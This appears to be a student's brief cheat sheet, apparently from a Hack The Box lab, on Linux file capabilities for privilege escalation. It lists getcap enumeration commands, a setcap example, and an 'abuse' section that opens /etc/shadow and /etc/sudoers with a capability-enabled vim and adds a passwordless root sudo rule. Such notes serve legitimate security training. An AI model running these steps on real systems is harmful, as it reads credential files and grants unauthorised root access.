```sh
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
getcap -r / 2>/dev/null
```
Some!!!
```sh
# set a capability
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
# possible values
=    +ep     +ei   +p 
# enumerate
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
getcap -r / 2>/dev/null
# abuse
/usr/bin/vim.basic /etc/shadow
/usr/bin/vim.basic /etc/sudoers
htb-sudent ALL=(root) NOPASSWD: ALL
:wq!
```
